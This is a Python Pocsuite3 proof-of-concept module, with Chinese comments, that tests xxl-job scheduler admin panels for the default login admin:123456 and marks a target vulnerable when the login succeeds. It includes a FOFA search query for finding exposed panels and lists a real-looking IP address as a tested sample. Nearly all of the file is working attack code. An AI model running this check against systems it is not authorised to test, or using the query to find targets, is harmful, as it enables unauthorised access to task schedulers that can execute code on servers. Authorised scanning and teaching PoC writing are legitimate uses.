from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

# 关于类的继承
class XXLJOBPOC(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "99033"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "enni"  # PoC作者的大名
    vulDate = "2022-7-13"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-13"  # 编写 PoC 的日期
    updateDate = "2022-7-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job"]  # 漏洞地址来源,0day不用写
    name = "xxl-job 弱口令 PoC"  # PoC 名称
    appPowerLink = "https://github.com/xuxueli/xxl-job"  # 漏洞厂商主页地址
    appName = "xxl-job"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://192.144.229.199:8004"]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ["requests"]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
                xxl-job后台存在弱口令,攻击者通过默认口令进去后台进行敏感操作
            """  # 漏洞简要描述
    pocDesc = """
                admin:123456
            """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        url = self.url.strip()
        full_url = f"{url}/api/v1/user/login"
        data = {"password": "123456", "username": "admin"}

        try:
            msg = requests.post(full_url, json=data, verify=False,allow_redirects=False,timeout=5)
            data_dict = msg.json()
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
            # 判断是否存在漏洞
            if data_dict.get("code") == 20000:
                result.append(url)
        except Exception as e:
            print(e)
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(XXLJOBPOC)